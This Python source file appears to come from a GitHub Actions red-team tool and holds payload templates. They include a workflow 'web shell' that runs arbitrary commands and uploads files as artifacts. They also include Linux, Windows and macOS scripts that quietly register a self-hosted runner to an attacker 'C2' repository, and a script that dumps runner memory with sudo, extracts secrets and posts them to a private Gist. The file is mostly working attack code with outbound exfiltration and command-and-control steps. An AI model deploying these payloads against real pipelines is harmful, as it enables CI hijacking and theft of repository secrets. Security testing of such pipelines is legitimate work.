class Payloads():
    """Collection of payload template used for various attacks.
    """
    ROR_SHELL = b"""
name: Web Shell
run-name: Shell - ${{ inputs.runner }} - ${{ inputs.cmd || inputs.download_file }}

on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: false
        type: string
      runner:
        description: "Runner"
        required: true
        type: string
      download_file:
        description: "Download a file instead of running a command."
        required: false
        type: string

jobs:
  build:
    runs-on: ${{ inputs.runner }}
    # We don't specify a shell type here, because it will use the default shell of the underlying OS.
    steps:
      - name: Run
        if: ${{ !inputs.download_file }}
        env:
          RUNNER_TRACKING_ID: 0
        run: ${{ inputs.cmd }}
        continue-on-error: true
      - name: Exfil
        if: ${{ inputs.download_file }}
        continue-on-error: true
        uses: actions/upload-artifact@v4
        with:
          path: ${{ inputs.download_file }}
          name: result
"""
    
    # Need to make sure we get the OS, Arch, Version right.
    ROR_GIST = """
REG_TOKEN=`echo "{0}" | base64 -d`
C2_REPO={1}
KEEP_ALIVE={4}

mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
tar xzf ./{2}
./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gatox-{5}" --labels "gatox-{5}" > /dev/null 2>&1
rm {2}

export RUNNER_ALLOW_RUNASROOT="1"
if [ "$KEEP_ALIVE" = true ]; then
    export RUNNER_TRACKING_ID=0 && ./run.sh > /dev/null 2>&1
else
    export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
fi
"""

    ROR_GIST_WINDOWS = """
mkdir C:\\.actions-runner1; cd C:\\.actions-runner1
Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/{3}/{2} -OutFile {2}
Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/{2}", "$PWD")
./config.cmd --url https://github.com/{1} --unattended --token {0}
$env:RUNNER_TRACKING_ID=0
Start-Process -WindowStyle Hidden -FilePath "./run.cmd"
"""

    ROR_GIST_MACOS = """
REG_TOKEN=`echo "{0}" | base64 -d`
C2_REPO={1}
KEEP_ALIVE={4}

mkdir -p $HOME/runner/.actions-runner/ && cd $HOME/runner/.actions-runner/
curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
tar xzf ./{2}
./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gato-ror" --labels "gato-ror" > /dev/null 2>&1
rm {2}

if [ "$KEEP_ALIVE" = true ]; then
    export RUNNER_TRACKING_ID=0 && ./run.sh > /dev/null 2>&1
else
    export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
fi
"""

    @staticmethod
    def create_exfil_payload():
        """Creates a Gist hosting an exfiltration payload.
        """

        payload = """
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  ENCODED_MEMDUMP="{}"
  B64_BLOB=`base64 -d $ENCODED_MEMDUMP | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' | sort -u | base64 -w 0`
  GIST_TOKEN="{}"
  GIST_TOKEN_DECODED=`echo $GIST_TOKEN | base64 -d`

  curl -L \
    -X POST \
    -H "Accept: application/vnd.github+json" \
    -H "Authorization: Bearer $GIST_TOKEN_DECODED" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    https://api.github.com/gists -d '{"public":false,"files":{"Exfil":{"content":"'$B64_BLOB'"}}}' > /dev/null

    sleep 900
else
  exit 0
fi
"""